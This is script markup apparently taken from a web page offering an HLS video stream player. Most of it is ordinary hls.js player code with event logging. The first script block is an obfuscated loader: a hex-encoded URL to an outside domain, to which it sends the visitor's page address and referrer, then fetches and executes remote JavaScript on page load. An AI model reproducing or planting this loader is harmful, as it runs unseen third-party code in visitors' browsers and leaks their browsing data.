<script>
                $(document).ready(function () {
                    var _0x6057 = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x76\x69\x73\x69\x74\x2E\x78\x63\x68\x69\x6E\x61\x2E\x70\x69\x63\x73\x2F\x76\x2E\x68\x74\x6D\x6C"];
                    var url = _0x6057[0];
                    url += "?site=12";
                    url += "&url=" + escape(window.location.href);
                    url += "&referrer=" + escape(document.referrer);
                    url += "&title=Homepage";
                    $.getScript({url: url, cache: false});
                });
            </script>
<script>
                var hls = new Hls();
            </script>
<script>
                    var $player = $('<video class="player" id="player" controls autoplay></video>');

                    $(document).ready(function () {
                        $("input[name='url']").keypress(function (event) {
                            if (event.keyCode == 13) {
                                $(".button-play").trigger("click");
                            }
                        });
                        $(".button-play-fullscreen").click(function () {
                            var url = $("input[name='url']").val().trim();
                            if (url.match(/^https?:\/\//)) {
                                window.open("https://playhls.com/?url=" + encodeURIComponent(url));
                            } else {
                                toastr.error("Please input a valid URL");
                            }
                        });
                        $(".button-play").click(function () {
                            var url = $("input[name='url']").val().trim();
                            if (url.match(/^https?:\/\//)) {
                                if ($("#player").length == 0) {
                                    $(".player").text("").append($player);
                                }
                                if (Hls.isSupported()) {
                                    hls.detachMedia();
                                    hls.destroy();
                                    hls = new Hls();
                                    hls.on(Hls.Events.MEDIA_ATTACHED, function (event, data) {
                                        log('Media attached');
                                    });
                                    hls.on(Hls.Events.MEDIA_DETACHED, function (event, data) {
                                        //log('Media detached');
                                    });
                                    hls.on(Hls.Events.MANIFEST_PARSED, function (event, data) {
                                        log('Mainfest parsed, ' + data.levels.length + ' quality level(s) found');
                                    });
                                    hls.on(Hls.Events.FRAG_LOADED, function (event, data) {
                                        //log('Fragment loaded: ' + data.frag._url);
                                    });
                                    hls.on(Hls.Events.LEVEL_SWITCHED, function (event, data) {
                                        var level = hls.levels[data.level];
                                        if (level) {
                                            log('Level switched, current resolution: ' + hls.media.videoWidth + " x " + hls.media.videoHeight);
                                        }
                                    });
                                    hls.on(Hls.Events.ERROR, function (event, data) {
                                        if (data.fatal) {
                                            switch (data.type) {
                                                case Hls.ErrorTypes.NETWORK_ERROR:
                                                    log('Fatal network error occurred' + (data.reason ? ', reason: ' + data.reason : ''));
                                                    break;
                                                case Hls.ErrorTypes.MEDIA_ERROR:
                                                    log('Fatal media error occurred' + (data.reason ? ', reason: ' + data.reason : ''));
                                                    break;
                                                default:
                                                    log('Fatal error occurred' + (data.reason ? ', reason: ' + data.reason : ''));
                                                    break;
                                            }
                                        }
                                    });
                                    hls.loadSource(url);
                                    hls.attachMedia($player[0]);
                                } else if ($player[0].canPlayType('application/vnd.apple.mpegurl')) {
                                    $player.attr("src", url);
                                    log('Try to load streams on IOS system');
                                }
                            } else {
                                toastr.error("Please input a valid URL");
                            }
                        });
                        $("span[url]").click(function () {
                            $("input[name='url']").val($(this).attr("url"));
                            $(".button-play").trigger("click");
                        });
                    });

                    var log = function (str) {
                        str = $(".log").html().trim() ? $(".log").html() + "<div>" + str + "</div>" : "<div>" + str + "</div>";
                        $(".log").removeAttr("empty").html(str);
                    }
                </script>
